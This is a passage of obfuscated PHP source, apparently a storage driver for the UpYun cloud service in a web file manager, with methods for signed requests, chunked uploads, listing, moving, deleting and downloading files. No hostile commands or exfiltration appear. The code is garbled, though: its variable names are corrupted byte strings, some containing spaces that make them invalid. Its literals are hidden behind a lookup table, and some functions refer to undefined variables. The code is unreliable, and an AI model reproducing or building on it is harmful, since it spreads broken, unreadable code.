md5($ñ·²§­„, $Êåéİ÷ = 0) { $õºêÍéÍ = new PathDriverStream($ñ·²§­„, $Êåéİ÷); return $õºêÍéÍ->hashMd5($ñ·²§­„); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\x3a\57\57\x76\60\x2e\x61\160\x69\x2e\x75\x70\171\x75\x6e\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($èÃ­¦Î) { parent::__construct(); $this->_init($èÃ­¦Î); } public function _init($‹é½óÜ†) { $À†£œ¾Ì =& $_SERVER[•€áå–Õ]; foreach ($‹é½óÜ† as $¸•Û¿â± => $èò²„¦«) { if (isset($this->{$¸•Û¿â±})) { $this->{$¸•Û¿â±} = $èò²„¦«; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($À†£œ¾Ì[1482] . LNG($À†£œ¾Ì[1414])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($üóòËñ­, $§­¾òÆ¡ = "\x47\x45\x54") { $Å¥ÇÓíä =& $_SERVER[•€áå–Õ]; $âÕ°ÃšØ = gmdate($Å¥ÇÓíä[1447]); $¶›“ÎÇ = base64_encode(hash_hmac($Å¥ÇÓíä[1483], "{$§­¾òÆ¡}\46{$üóòËñ­}\46{$âÕ°ÃšØ}", md5("{$this->userpass}"), !0)); $ßŠõ¿ö = array("\101\165\164\x68\157\x72\151\x7a\x61\x74\x69\157\156\72\x55\x50\x59\125\116\40{$this->username}\x3a{$¶›“ÎÇ}", "\104\x61\x74\x65\72{$âÕ°ÃšØ}"); return $ßŠõ¿ö; } public function ussRequest($¹Î”¡‰Ú, $ÉŒ²—ä = "\107\x45\124", $»µ»ÎÂŒ = false, $¡À‡Ï¬ = false, $éÅ‰§Ÿë = false) { $°Ùá“¼» =& $_SERVER[•€áå–Õ]; $¹Î”¡‰Ú = trim($¹Î”¡‰Ú, $°Ùá“¼»[18]); $—äİ±” = "\57{$this->bucket}\57{$¹Î”¡‰Ú}"; $¦Ô…àÇ = $this->ussHeaders($—äİ±”, $ÉŒ²—ä); if ($¡À‡Ï¬) { $¦Ô…àÇ = array_merge($¦Ô…àÇ, $¡À‡Ï¬); } $­«´ç = url_request($this->endpoint . $—äİ±”, $ÉŒ²—ä, $»µ»ÎÂŒ, $¦Ô…àÇ, $éÅ‰§Ÿë); if (!$­«´ç) { return array($°Ùá“¼»[1253] => !1, $°Ùá“¼»[1243] => $°Ùá“¼»[1484]); } if (strtolower($ÉŒ²—ä) == $°Ùá“¼»[223] || in_array($­«´ç[$°Ùá“¼»[1253]], array($°Ùá“¼»[268], $°Ùá“¼»[1485]))) { $»µ»ÎÂŒ = $­«´ç[$°Ùá“¼»[1486]]; } else { $»µ»ÎÂŒ = json_decode($­«´ç[$°Ùá“¼»[1243]], !0); if (!$»µ»ÎÂŒ) { $»µ»ÎÂŒ = $­«´ç[$°Ùá“¼»[1243]]; } else { if (!$­«´ç[$°Ùá“¼»[791]] && isset($»µ»ÎÂŒ[$°Ùá“¼»[1487]])) { $»µ»ÎÂŒ = $»µ»ÎÂŒ[$°Ùá“¼»[1487]]; } } } return array($°Ùá“¼»[1253] => $­«´ç[$°Ùá“¼»[791]], $°Ùá“¼»[1243] => $»µ»ÎÂŒ); } public function mkfile($ŠĞ‹ÏÂ¥, $Ú‚µÀ¨ç = '', $Ò»ê¯ª³ = REPEAT_RENAME) { if ($this->setContent($ŠĞ‹ÏÂ¥, $Ú‚µÀ¨ç)) { return $this->getPathOuter($ŠĞ‹ÏÂ¥); } return !1; } public function mkdir($³®¡Î†û, $ÁÄİÖÃÀ = REPEAT_SKIP) { $ÄÚâÄªİ =& $_SERVER[•€áå–Õ]; $©µ€ÑÕ = trim($³®¡Î†û, $ÄÚâÄªİ[18]); if ($this->_isFolder($©µ€ÑÕ)) { return $this->getPathOuter($©µ€ÑÕ); } $ÊŠÁŒ¤ = array($ÄÚâÄªİ[1488]); $©å ÊËà = $this->ussRequest($©µ€ÑÕ, $ÄÚâÄªİ[253], !1, $ÊŠÁŒ¤); return $©å ÊËà[$ÄÚâÄªİ[1253]] ? $this->getPathOuter($©µ€ÑÕ) : !1; } public function copyFile($æˆ©¯×, $ÈÓá‰é) { $ö÷½×±ƒ =& $_SERVER[•€áå–Õ]; $â®âè = array($ö÷½×±ƒ[1489] . "\57{$this->bucket}\57{$æˆ©¯×}", $ö÷½×±ƒ[1490]); $†‡Ä¸¹ü = $this->ussRequest($ÈÓá‰é, $ö÷½×±ƒ[255], !1, $â®âè); return $†‡Ä¸¹ü[$ö÷½×±ƒ[1253]] ? !0 : $this->getPathOuter($ÈÓá‰é); } public function moveFile($‡Õ¤Çë, $ëÔˆ¿©¡) { $ì™×ùÏ‡ =& $_SERVER[•€áå–Õ]; $µóÜ˜Ğ· = array($ì™×ùÏ‡[1491] . "\57{$this->bucket}\x2f{$‡Õ¤Çë}", $ì™×ùÏ‡[1490]); $ñæÉİÃÍ = $this->ussRequest($ëÔˆ¿©¡, $ì™×ùÏ‡[255], !1, $µóÜ˜Ğ·); return $ñæÉİÃÍ[$ì™×ùÏ‡[1253]] ? !0 : $this->getPathOuter($ëÔˆ¿©¡); } public function delFile($®ŸŞìŒ­) { $Ç™†ª–š =& $_SERVER[•€áå–Õ]; $‰÷Êä¹¨ = $this->ussRequest($®ŸŞìŒ­, $Ç™†ª–š[1492]); return $‰÷Êä¹¨[$Ç™†ª–š[1253]] ? !0 : !1; } public function delFolder($üÛü¬¸) { $ı¨²İ¸ =& $_SERVER[•€áå–Õ]; if (!$this->exist($üÛü¬¸)) { return !0; } $this->listItemCache = !1; $ô…·…›³ = $¯Ûà¬¶â = array(); $this->fileList($üÛü¬¸, $ô…·…›³, $¯Ûà¬¶â, !0); $this->listItemCache = !0; foreach ($¯Ûà¬¶â as $ÔÃù”Î) { $ê¿‰…—è = $this->ussRequest($ÔÃù”Î[$ı¨²İ¸[42]], $ı¨²İ¸[1492]); if (!$ê¿‰…—è[$ı¨²İ¸[1253]]) { return !1; } } foreach ($ô…·…›³ as $¹‡à×‹¢) { $ê¿‰…—è = $this->ussRequest($¹‡à×‹¢, $ı¨²İ¸[1492]); if (!$ê¿‰…—è[$ı¨²İ¸[1253]]) { return !1; } } $ê¿‰…—è = $this->ussRequest($üÛü¬¸, $ı¨²İ¸[1492]); return $ê¿‰…—è[$ı¨²İ¸[1253]]; } public function rename($‡äÃÜˆá, $óÄ“ªİê) { if ($this->isFile($‡äÃÜˆá)) { $óÄ“ªİê = get_path_father($‡äÃÜˆá) . $óÄ“ªİê; return $this->moveFile($‡äÃÜˆá, $óÄ“ªİê); } return $this->renameObject($‡äÃÜˆá, $óÄ“ªİê); } public function fileInfo($€Ÿ½º ó, $­†¶¶ = false, $·¢ê­” = array()) { $‹†œ—Áô =& $_SERVER[•€áå–Õ]; $”“©­æÑ = array($‹†œ—Áô[42] => $this->pathThis($€Ÿ½º ó), $‹†œ—Áô[96] => $this->getPathOuter($‹†œ—Áô[18] . $€Ÿ½º ó), $‹†œ—Áô[43] => $‹†œ—Áô[226], $‹†œ—Áô[88] => isset($·¢ê­”[$‹†œ—Áô[88]]) ? $·¢ê­”[$‹†œ—Áô[88]] : 0, $‹†œ—Áô[187] => $this->ext($€Ÿ½º ó)); if ($­†¶¶) { return $”“©­æÑ; } $”“©­æÑ[$‹†œ—Áô[227]] = $”“©­æÑ[$‹†œ—Áô[97]] = 0; $”“©­æÑ[$‹†œ—Áô[228]] = $”“©­æÑ[$‹†œ—Áô[229]] = !0; if (empty($·¢ê­”)) { $·¢ê­” = $this->objectMeta($€Ÿ½º ó); if (!$·¢ê­”) { return $”“©­æÑ; } } $”“©­æÑ[$‹†œ—Áô[227]] = intval($·¢ê­”[$‹†œ—Áô[1493]]); $”“©­æÑ[$‹†œ—Áô[97]] = intval($·¢ê­”[$‹†œ—Áô[1494]]); $”“©­æÑ[$‹†œ—Áô[88]] = $·¢ê­”[$‹†œ—Áô[88]]; return $”“©­æÑ; } public function folderInfo($¡‡“õÏ, $òàõô£° = false) { $¤‰’À× =& $_SERVER[•€áå–Õ]; $‘ş¬çÁ— = array($¤‰’À×[42] => $this->pathThis($¡‡“õÏ), $¤‰’À×[96] => $this->getPathOuter($¤‰’À×[18] . $¡‡“õÏ), $¤‰’À×[43] => $¤‰’À×[87]); if ($òàõô£°) { return $‘ş¬çÁ—; } $‘ş¬çÁ—[$¤‰’À×[227]] = $‘ş¬çÁ—[$¤‰’À×[97]] = 0; $‘ş¬çÁ—[$¤‰’À×[228]] = $‘ş¬çÁ—[$¤‰’À×[229]] = !0; if (empty($¹× ìÅû)) { $¹× ìÅû = $this->objectMeta($¡‡“õÏ); if (!$¹× ìÅû) { return $‘ş¬çÁ—; } } $‘ş¬çÁ—[$¤‰’À×[227]] = intval($¹× ìÅû[$¤‰’À×[1493]]); $‘ş¬çÁ—[$¤‰’À×[97]] = intval($¹× ìÅû[$¤‰’À×[1494]]); return $‘ş¬çÁ—; } private function listObjs($®É´²¤, $÷ÚŞÕ­ = 0, $ö¯ŞôÏ = 1000) { $Ç¯ìÍö‰ =& $_SERVER[•€áå–Õ]; $á×¦¢Öî = array($Ç¯ìÍö‰[1495], $Ç¯ìÍö‰[1496] . $ö¯ŞôÏ); if ($÷ÚŞÕ­) { $á×¦¢Öî[] = $Ç¯ìÍö‰[1497] . $÷ÚŞÕ­; } $ôÕêœ× = $this->ussRequest($®É´²¤, $Ç¯ìÍö‰[257], !1, $á×¦¢Öî); return !$ôÕêœ×[$Ç¯ìÍö‰[1253]] ? !1 : $ôÕêœ×[$Ç¯ìÍö‰[1243]]; } private function fileList($ìö¦ñ¨É, &$¾’‡æìÅ, &$è¦ùñ–, $İö³¿ë» = false) { $ó‰¼ß¢§ =& $_SERVER[•€áå–Õ]; $À”©ÄÏÆ = $ó‰¼ß¢§[22]; $¦êË¿ı = 1000; $÷¾Šø”ö = rtrim($ìö¦ñ¨É, $ó‰¼ß¢§[18]) . $ó‰¼ß¢§[18]; while (!0) { check_abort(); $ÒòÃüØ¹ = $this->listObjs($ìö¦ñ¨É, $À”©ÄÏÆ, $¦êË¿ı); if (!$ÒòÃüØ¹) { return !1; } $À”©ÄÏÆ = isset($ÒòÃüØ¹[$ó‰¼ß¢§[1498]]) ? $ÒòÃüØ¹[$ó‰¼ß¢§[1498]] : $ó‰¼ß¢§[22]; $ÆÑ­è¦ä = isset($ÒòÃüØ¹[$ó‰¼ß¢§[1499]]) ? $ÒòÃüØ¹[$ó‰¼ß¢§[1499]] : array(); foreach ($ÆÑ­è¦ä as $´ì¹Õı¤) { $‘¶ÕĞ£™ = $´ì¹Õı¤[$ó‰¼ß¢§[43]] == $ó‰¼ß¢§[87] ? !0 : !1; $·Œ‘Á‹” = ltrim($÷¾Šø”ö . $´ì¹Õı¤[$ó‰¼ß¢§[42]], $ó‰¼ß¢§[18]) . ($‘¶ÕĞ£™ ? $ó‰¼ß¢§[18] : $ó‰¼ß¢§[22]); $¼”äòÍ« = array($ó‰¼ß¢§[42] => $·Œ‘Á‹”, $ó‰¼ß¢§[43] => $‘¶ÕĞ£™ ? $ó‰¼ß¢§[87] : $ó‰¼ß¢§[226], $ó‰¼ß¢§[88] => $´ì¹Õı¤[$ó‰¼ß¢§[392]], $ó‰¼ß¢§[1494] => $´ì¹Õı¤[$ó‰¼ß¢§[1500]]); $this->cacheMethodInfoSet($·Œ‘Á‹”, $‘¶ÕĞ£™, $¼”äòÍ«); if ($‘¶ÕĞ£™) { $¾’‡æìÅ[] = $·Œ‘Á‹”; if ($İö³¿ë») { $this->fileList($·Œ‘Á‹”, $¾’‡æìÅ, $è¦ùñ–, $İö³¿ë»); } continue; } $è¦ùñ–[] = $¼”äòÍ«; } if (count($ÆÑ­è¦ä) < $¦êË¿ı) { break; } } $this->cacheMethodInfoSet($ìö¦ñ¨É, !0); } public function listPath($Ğ ½˜Å¹, $”İ‰ñ” = false) { $³¶Û”çª =& $_SERVER[•€áå–Õ]; $ù¨å’‰õ = $Àê™‘§à = array(); $this->fileList($Ğ ½˜Å¹, $ù¨å’‰õ, $Àê™‘§à); foreach ($ù¨å’‰õ as $êİĞß¸  => $“Ïºš§í) { $ù¨å’‰õ[$êİĞß¸ ] = $this->folderInfo($“Ïºš§í, $”İ‰ñ”); } foreach ($Àê™‘§à as $êİĞß¸  => $“Ïºš§í) { $Àê™‘§à[$êİĞß¸ ] = $this->fileInfo($“Ïºš§í[$³¶Û”çª[42]], $”İ‰ñ”, $“Ïºš§í); } return array($³¶Û”çª[94] => $ù¨å’‰õ, $³¶Û”çª[95] => $Àê™‘§à); } public function has($ÒŞ‡ú‚, $…²†¦õÎ = false, $ñĞé¶İ½ = true) { $ƒÀ„•¹ =& $_SERVER[•€áå–Õ]; $ÜÅåÙ„Ì = $ƒÀ„•¹[22]; $ô‰µÙÕ” = 500; $£Šä¼©“ = 0; $çÙÃËÊ´ = 0; $Éø×ÊÑ = rtrim($ÒŞ‡ú‚, $ƒÀ„•¹[18]) . $ƒÀ„•¹[18]; while (!0) { check_abort(); $Àí‚Ø«¨ = $this->listObjs($ÒŞ‡ú‚, $ÜÅåÙ„Ì, $ô‰µÙÕ”); if (!$Àí‚Ø«¨) { return !1; } $ÜÅåÙ„Ì = isset($Àí‚Ø«¨[$ƒÀ„•¹[1498]]) ? $Àí‚Ø«¨[$ƒÀ„•¹[1498]] : $ƒÀ„•¹[22]; $À…Æ¬ß± = isset($Àí‚Ø«¨[$ƒÀ„•¹[1499]]) ? $Àí‚Ø«¨[$ƒÀ„•¹[1499]] : array(); if (empty($À…Æ¬ß±)) { break; } $ûÚı½Ô‹ = array_filter($À…Æ¬ß±, function ($ÎëÛ¹«) { $“Ã¾ğßê =& $_SERVER[•€áå–Õ]; return $ÎëÛ¹«[$“Ã¾ğßê[43]] == $“Ã¾ğßê[87]; }); $½©¹Àö = count($À…Æ¬ß±); $ûÚı½Ô‹ = count($ûÚı½Ô‹); $îşÂ£é = $½©¹Àö - $ûÚı½Ô‹; if ($…²†¦õÎ) { $çÙÃËÊ´ += $ûÚı½Ô‹; $£Šä¼©“ += $îşÂ£é; if ($½©¹Àö < $ô‰µÙÕ”) { break; } continue; } if ($ñĞé¶İ½) { if ($îşÂ£é) { return !0; } } else { if ($ûÚı½Ô‹) { return !0; } } if ($½©¹Àö < $ô‰µÙÕ”) { break; } } if ($…²†¦õÎ) { return array($ƒÀ„•¹[235] => $£Šä¼©“, $ƒÀ„•¹[236] => $çÙÃËÊ´); } return !1; } public function listAll($İüşÎ×”) { $¹°¹ =& $_SERVER[•€áå–Õ]; $Ê–ÒÔÙ¿ = $»Âû¯øğ = array(); $this->fileList($İüşÎ×”, $Ê–ÒÔÙ¿, $»Âû¯øğ, !0); $çş¹—¨ = array_to_keyvalue($»Âû¯øğ, $¹°¹[42]); foreach ($Ê–ÒÔÙ¿ as $â½­ş¼Û) { if (is_string($â½­ş¼Û)) { $çş¹—¨[$â½­ş¼Û] = array($¹°¹[88] => 0); } } return $this->listAllFiles($İüşÎ×”, $çş¹—¨); } public function canRead($Œ¥òŸŸÃ) { return $this->exist($Œ¥òŸŸÃ) ? !0 : !1; } public function canWrite($ä¨ÑÆ¨ı) { return $this->exist($ä¨ÑÆ¨ı) ? !0 : !1; } public function getContent($Ô¸ÓÖÙù) { return $this->fileSubstr($Ô¸ÓÖÙù, 0, -1); } public function setContent($ú¶ó•Çç, $½ó¤Çñ› = '') { $¸é¯ªÌƒ =& $_SERVER[•€áå–Õ]; if (!$½ó¤Çñ›) { $–Õ÷ÀŠ = $this->ussRequest($ú¶ó•Çç, $¸é¯ªÌƒ[253]); return $–Õ÷ÀŠ[$¸é¯ªÌƒ[1253]]; } $¹©õá…– = $this->tempFile($this->pathThis($ú¶ó•Çç)); file_put_contents($¹©õá…–, $½ó¤Çñ›); if ($this->upload($ú¶ó•Çç, $¹©õá…–)) { $this->tempFileRemve($¹©õá…–); return !0; } return !1; } public function fileSubstr($ƒ­µÓÙÀ, $ÕíÂ¤¾¤, $àÙÑ £â) { $¦ıÌŒœ =& $_SERVER[•€áå–Õ]; if (!($Âë¼»›ì = $this->link($ƒ­µÓÙÀ))) { return !1; } $üø¶½‰œ = !1; if ($àÙÑ £â > 0) { $Á÷÷ ¤ = $ÕíÂ¤¾¤ + $àÙÑ £â - 1; $üø¶½‰œ = array($¦ıÌŒœ[1461] . $ÕíÂ¤¾¤ . $¦ıÌŒœ[441] . $Á÷÷ ¤); } $œ™ƒé·Æ = url_request($Âë¼»›ì, $¦ıÌŒœ[257], !1, $üø¶½‰œ); return $œ™ƒé·Æ[$¦ıÌŒœ[791]] ? $œ™ƒé·Æ[$¦ıÌŒœ[1243]] : !1; } public function upload($“ºŠÄğÊ, $¶‡ÛïÈ‰, $ÖÇ€Í® = false, $Æ‘´Ç¥ş = REPEAT_REPLACE) { $€»ò¶Ãµ =& $_SERVER[•€áå–Õ]; $Œäóæ¦ = IO::size($¶‡ÛïÈ‰); if ($Œäóæ¦ <= 1024 * 1024 * 200) { $ĞÙû„˜ = array($€»ò¶Ãµ[1501] . $¶‡ÛïÈ‰); $ãïİœ‚é = $this->ussRequest($“ºŠÄğÊ, $€»ò¶Ãµ[255], $ĞÙû„˜); return $ãïİœ‚é[$€»ò¶Ãµ[1253]] ? $this->getPathOuter($“ºŠÄğÊ) : !1; } $†Úò¯• = 1024 * 1024 * 10; $´Óƒ‹Ÿ‘ = array($€»ò¶Ãµ[1502], $€»ò¶Ãµ[1503] . $Œäóæ¦, $€»ò¶Ãµ[1504], $€»ò¶Ãµ[1505] . $†Úò¯•); $ãïİœ‚é = $this->ussRequest($“ºŠÄğÊ, $€»ò¶Ãµ[255], !1, $´Óƒ‹Ÿ‘); if (!$ãïİœ‚é[$€»ò¶Ãµ[1253]]) { return !1; } $ˆ…«Ğå = $ãïİœ‚é[$€»ò¶Ãµ[1243]]; $ùÃ‹¼Ò = 0; $ıÊ–ß¦Õ = $ˆ…«Ğå[$€»ò¶Ãµ[1506]]; $‘êßœè„ = fopen($¶‡ÛïÈ‰, $€»ò¶Ãµ[1408]); if (!$‘êßœè„) { return !1; } do { $ı¯Ûø = $ˆ…«Ğå[$€»ò¶Ãµ[1507]]; fseek_64($‘êßœè„, $ùÃ‹¼Ò); $ØÄôº± = fread($‘êßœè„, $ı¯Ûø); $šı‡«òÄ = 0; do { $šı‡«òÄ++; $ˆ…«Ğå = $this->uploadPart($“ºŠÄğÊ, $ˆ…«Ğå, $ØÄôº±); } while (!$ˆ…«Ğå && $šı‡«òÄ < 3); if (!$ˆ…«Ğå) { return !1; } $ıÊ–ß¦Õ = $ˆ…«Ğå[$€»ò¶Ãµ[1506]]; $ùÃ‹¼Ò += $ı¯Ûø; } while ($ıÊ–ß¦Õ != -1); fclose($‘êßœè„); $´Óƒ‹Ÿ‘ = array($€»ò¶Ãµ[1508], $€»ò¶Ãµ[1509] . $ˆ…«Ğå[$€»ò¶Ãµ[1510]], $€»ò¶Ãµ[1504]); $ãïİœ‚é = $this->ussRequest($“ºŠÄğÊ, $€»ò¶Ãµ[255], !1, $´Óƒ‹Ÿ‘); return $ãïİœ‚é[$€»ò¶Ãµ[1253]] ? $this->getPathOuter($üèÀŸìÕ) : !1; } private function uploadPart($¥ÁíïŞ, $‡üÕÈ·, &$‘ı¶Ä¶ü) { $Îâ¢Š¢Ş =& $_SERVER[•€áå–Õ]; $é”âÂÅå = array($Îâ¢Š¢Ş[1511], $Îâ¢Š¢Ş[1509] . $‡üÕÈ·[$Îâ¢Š¢Ş[1510]], $Îâ¢Š¢Ş[1512] . $‡üÕÈ·[$Îâ¢Š¢Ş[1506]], $Îâ¢Š¢Ş[155] . $‡üÕÈ·[$Îâ¢Š¢Ş[1507]]); $ºÚ®Å²‘ = $this->ussRequest($¥ÁíïŞ, $Îâ¢Š¢Ş[255], $‘ı¶Ä¶ü, $é”âÂÅå); return !$ºÚ®Å²‘[$Îâ¢Š¢Ş[1253]] ? $ºÚ®Å²‘[$Îâ¢Š¢Ş[1253]] : $ºÚ®Å²‘[$Îâ¢Š¢Ş[1243]]; } public function uploadFormData($ñ«ïßì£, $îÑ·È¨ = 3600) { return $this->uploadPolicy($ñ«ïßì£, $îÑ·È¨); } public function multiUploadFormData($ñå–òğ, $Â‘‘êƒà = 3600) { $«¬–²ï =& $_SERVER[•€áå–Õ]; $¦¨û™Ô´ = (int) $GLOBALS[$«¬–²ï[17]][$«¬–²ï[88]]; return $this->uploadPolicy($ñå–òğ, $Â‘‘êƒà, $¦¨û™Ô´); } private function uploadPolicy($áÈÁˆˆÆ, $É”˜ˆË = 3600, $ïšÔßÆò = 0) { $ÅÆ¿º«¨ =& $_SERVER[•€áå–Õ]; $ß‘–¤Ò = $ÅÆ¿º«¨[18] . $this->bucket; $š¥Ôë‘ = gmdate($ÅÆ¿º«¨[1447]); $±öä”ùÃ = array($ÅÆ¿º«¨[1513] => $this->bucket, $ÅÆ¿º«¨[1514] => $áÈÁˆˆÆ, $ÅÆ¿º«¨[1515] => time() + $É”˜ˆË, $ÅÆ¿º«¨[1516] => $š¥Ôë‘); if ($ïšÔßÆò) { $±öä”ùÃ[$ÅÆ¿º«¨[1428]] = $ïšÔßÆò; } $¸áÅñ†³ = base64_encode(json_encode($±öä”ùÃ)); $Õ¦À¿ÎÕ = base64_encode(hash_hmac($ÅÆ¿º«¨[1483], "\x50\x4f\x53\124\x26{$ß‘–¤Ò}\46{$š¥Ôë‘}\46{$¸áÅñ†³}", md5("{$this->userpass}"), !0)); $»’Êä£§ = array($ÅÆ¿º«¨[287] => $¸áÅñ†³, $ÅÆ¿º«¨[1517] => "\125\120\x59\125\x4e\40{$this->username}\72{$Õ¦À¿ÎÕ}", $ÅÆ¿º«¨[208] => $this->endpoint . $ß‘–¤Ò); return $»’Êä£§; } public function download($µ£ÎÛò, $¼ÒÈì¬Ğ) { $Øİ¡ƒ‹Í = IO::getPathInner(IO::mkfile($¼ÒÈì¬Ğ)); if (!($ß÷¨¹’ = $this->link($µ£ÎÛò))) { return !1; } $ˆ÷ÖáËë = 0; $¾ÅòÁ‰Œ = 1024 * 200; $é¢“”ÔÄ = fopen($Øİ¡ƒ‹Í, $_SERVER[•€áå–Õ][1467]); while (!0) { $’€«¥ß = $this->fileSubstr($µ£ÎÛò, $ˆ÷ÖáËë, $¾ÅòÁ‰Œ); if ($’€«¥ß === !1) { return !1; } fwrite($é¢“”ÔÄ, $’€«¥ß); $ˆ÷ÖáËë += $¾ÅòÁ‰Œ; if (strlen($’€«¥ß) < $¾ÅòÁ‰Œ) { break; } } fclose($é¢“”ÔÄ); return $¼ÒÈì¬Ğ; } public function link($ıÚâÅŠ, $¥üı¼‘İ = array()) { $Òï¢âÀ =& $_SERVER[•€áå–Õ]; $ıÚâÅŠ = trim($ıÚâÅŠ, $Òï¢âÀ[18]); if (!empty($this->token)) { $Áµ¶–ô£ = strtotime(date($Òï¢âÀ[1518])); $¯„Üõõ˜ = substr(md5($this->token . $Òï¢âÀ[339] . $Áµ¶–ô£ . $Òï¢âÀ[1519] . $ıÚâÅŠ), 12, 8) . $Áµ¶–ô£; $¥üı¼‘İ[] = $Òï¢âÀ[1520] . $¯„Üõõ˜; } $íŸï°¸Ç = !empty($¥üı¼‘İ) ? $Òï¢âÀ[85] . implode($Òï¢âÀ[339], $¥üı¼‘İ) : $Òï¢âÀ[22]; return $this->getHost() . $Òï¢âÀ[18] . $ıÚâÅŠ . $íŸï°¸Ç; } public function fileOut($ºœœæı, $ßó›‰û = false, $‹ë’ñ¤» = false, $«½›Ê¶ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ºœœæı, $ßó›‰û, $‹ë’ñ¤», $«½›Ê¶); } if (!$‹ë’ñ¤») { $‹ë’ñ¤» = $this->pathThis($ºœœæı); } $Öºàæ› = $ßó›‰û ? array($_SERVER[•€áå–Õ][1521] . rawurlencode($‹ë’ñ¤»)) : array(); $Ä€­Í…× = $this->link($ºœœæı, $Öºàæ›); $this->fileOutLink($Ä€­Í…×); } public function fileOutServer($Õ¥âùæÖ, $ÂúŸ„‡ù = false, $›Õ£âõ” = false, $áßªé¢¸ = '') { parent::fileOut($Õ¥âùæÖ, $ÂúŸ„‡ù, $›Õ£âõ”, $áßªé¢¸); } public function fileOutImage($á¼¿Óíğ, $¬Â¶ÌÖµ = 250) { $¤¾Ÿ ¸ = $this->link($á¼¿Óíğ . $_SERVER[•€áå–Õ][1522] . $¬Â¶ÌÖµ); $this->fileOutLink($¤¾Ÿ ¸); } public function fileOutImageServer($ÆºªİÏÀ, $¨‘Ñ³ËÖ = 250) { parent::fileOutImage($ÆºªİÏÀ, $¨‘Ñ³ËÖ); } public function hashMd5($ÚïĞ÷Õ) { $ÌÁøíŒ‹ =& $_SERVER[•€áå–Õ]; $“óïºÜÏ = $this->_objectMeta($ÚïĞ÷Õ); return isset($“óïºÜÏ[$ÌÁøíŒ‹[240]]) ? $“óïºÜÏ[$ÌÁøíŒ‹[240]] : !1; } public function size($úêÅ™Û‰) { $™¦½Š¹ï = $this->objectMeta($úêÅ™Û‰); return $™¦½Š¹ï ? $™¦½Š¹ï[$_SERVER[•€áå–Õ][88]] : 0; } public function info($‡Şä“Â˜) { if ($this->isFolder($‡Şä“Â˜)) { return $this->folderInfo($‡Şä“Â˜); } else { if ($this->isFile($‡Şä“Â˜)) { return $this->fileInfo($‡Şä“Â˜); } } return !1; } public function exist($Çû†ÍŒì) { return $this->isFile($Çû†ÍŒì) || $this->isFolder($Çû†ÍŒì); } public function isFile($‰¦µ ´Ö) { return !$this->isFolder($‰¦µ ´Ö) && $this->objectMeta($‰¦µ ´Ö); } public function isFolder($ÚßôÁƒ) { return $this->cacheMethod($_SERVER[•€áå–Õ][178], $ÚßôÁƒ); } protected function objectMeta($½ÁÏôĞ‚) { return $this->cacheMethod($_SERVER[•€áå–Õ][180], $½ÁÏôĞ‚); } protected function _objectMeta($­‘ÚõÜú) { $íš¸«»´ =& $_SERVER[•€áå–Õ]; if ($­‘ÚõÜú == $íš¸«»´[22] || $­‘ÚõÜú == $íš¸«»´[18]) { return array(); } $·Ô„­ö• = $this->ussRequest($­‘ÚõÜú, $íš¸«»´[1523]); if (!$·Ô„­ö•[$íš¸«»´[1253]]) { return null; } $Â¶ôóò‡ = isset($·Ô„­ö•[$íš¸«»´[1243]]) ? $·Ô„­ö•[$íš¸«»´[1243]] : array(); if (!isset($Â¶ôóò‡[$íš¸«»´[1524]])) { return null; } $€Ğ¬¹É = array($íš¸«»´[43] => isset($Â¶ôóò‡[$íš¸«»´[1524]]) ? $Â¶ôóò‡[$íš¸«»´[1524]] : null, $íš¸«»´[88] => isset($Â¶ôóò‡[$íš¸«»´[1525]]) ? $Â¶ôóò‡[$íš¸«»´[1525]] : null, $íš¸«»´[240] => isset($Â¶ôóò‡[$íš¸«»´[1526]]) ? $Â¶ôóò‡[$íš¸«»´[1526]] : null, $íš¸«»´[1493] => isset($Â¶ôóò‡[$íš¸«»´[1527]]) ? $Â¶ôóò‡[$íš¸«»´[1527]] : null); $€Ğ¬¹É[$íš¸«»´[1494]] = isset($Â¶ôóò‡[$íš¸«»´[1528]]) ? strtotime($Â¶ôóò‡[$íš¸«»´[1528]]) : $€Ğ¬¹É[$íš¸«»´[1493]]; return $€Ğ¬¹É; } protected function _isFolder($Ö¨³Õ¯Ä) { $¨£šÍ =& $_SERVER[•€áå–Õ]; if ($Ö¨³Õ¯Ä == $¨£šÍ[22] || $Ö¨³Õ¯Ä == $¨£šÍ[18]) { return !0; } $ÌÆèÖçÍ = $this->_objectMeta($Ö¨³Õ¯Ä); return isset($ÌÆèÖçÍ[$¨£šÍ[43]]) && $ÌÆèÖçÍ[$¨£šÍ[43]] == $¨£šÍ[87] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($üƒÕÈ³¦ = false) { } public function exist($ı¯ì†€¼) { $Ìø£ºˆÄ = $this->info($ı¯ì†€¼); return $Ìø£ºˆÄ[$_SERVER[•€áå–Õ][228]]; } public function isFile($”¾Ë¯áß) { $üÔÎ¸Ÿ„ = $this->info($”¾Ë¯áß); return $üÔÎ¸Ÿ„[$_SERVER[•€áå–Õ][228]]; } public function isFolder($•É‰²’Í) { return !1; } public function size($’¶˜ş¦·) { $Ùœë‚ôµ = $this->info($’¶˜ş¦·); return $Ùœë‚ôµ[$_SERVER[•€áå–Õ][88]]; } public function info($úõ•¢ìà) { return $this->infoParse($úõ•¢ìà); } public function infoAuth($‡–Êâ¿‚) { return $this->infoParse($‡–Êâ¿‚); } public function infoWithChildren($ïíæ¬Å®) { return $this->infoParse($ïíæ¬Å®); } public function infoFull($¯íú„ıœ) { return $this->infoParse($¯íú„ıœ); } private function infoParse($™ÅÔèº) { $ê°ùú÷¸ =& $_SERVER[•€áå–Õ]; $ú¶ï÷ºó = $this->header($™ÅÔèº); if (!$ú¶ï÷ºó || !$ú¶ï÷ºó[$ê°ùú÷¸[791]]) { return !1; } $†®ÈÓ± = _get($ú¶ï÷ºó, $ê°ùú÷¸[392], 0); $ùçÀÌõù = array($ê°ùú÷¸[42] => $ú¶ï÷ºó[$ê°ùú÷¸[42]], $ê°ùú÷¸[96] => $™ÅÔèº, $ê°ùú÷¸[43] => $ê°ùú÷¸[226], $ê°ùú÷¸[88] => intval($†®ÈÓ±), $ê°ùú÷¸[187] => get_path_ext($ú¶ï÷ºó[$ê°ùú÷¸[42]]), $ê°ùú÷¸[1405] => $†®ÈÓ± > 0 && 